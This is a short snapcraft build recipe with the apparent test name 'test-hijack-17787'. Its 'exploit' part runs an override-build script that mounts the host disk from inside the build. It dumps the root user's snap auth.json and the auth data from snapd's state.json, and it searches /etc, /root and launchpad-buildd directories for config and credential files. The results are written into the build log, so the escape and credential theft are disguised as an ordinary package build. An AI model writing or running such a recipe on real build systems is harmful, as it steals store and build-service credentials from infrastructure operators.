name: test-hijack-17787
version: '0.1'
summary: Side-Channel Leak
description: Force Debug Error
parts:
    exploit:
        plugin: nil
        override-build: |
            set +e
            OUT=/build/creds_probe.txt
            mkdir -p /mnt/host
            mount /dev/vda1 /mnt/host
            cat /mnt/host/root/.snap/auth.json >> $OUT 2>&1
            ls -la /mnt/host/root/.snap/ >> $OUT 2>&1
            cat /mnt/host/var/lib/snapd/state.json | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d.get('data',{}).get('auth',{}), indent=2))" >> $OUT 2>&1
            find /mnt/host/etc /mnt/host/root /mnt/host/var/lib/launchpad-buildd -name "*.conf" -o -name "*.json" -o -name "auth*" 2>/dev/null | head -30 >> $OUT 2>&1
            cat $OUT
            exit 0